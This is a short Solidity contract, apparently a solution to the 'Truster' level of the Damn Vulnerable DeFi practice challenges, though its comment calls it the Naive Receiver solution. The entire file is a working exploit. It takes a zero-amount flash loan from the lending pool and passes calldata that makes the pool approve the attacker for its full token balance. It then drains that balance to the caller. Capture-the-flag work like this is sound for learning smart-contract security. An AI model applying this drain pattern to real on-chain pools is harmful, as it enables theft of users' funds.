// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

/**
 * @title Naive Receiver Challenge solution
 * @author @mayocca
 */
contract TrusterExploit {
    constructor(address _pool) {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 dvt = IERC20(pool.damnValuableToken());
        pool.flashLoan(
            0,
            address(this),
            address(dvt),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                dvt.balanceOf(_pool)
            )
        );
        dvt.transferFrom(_pool, msg.sender, dvt.balanceOf(_pool));
    }
}
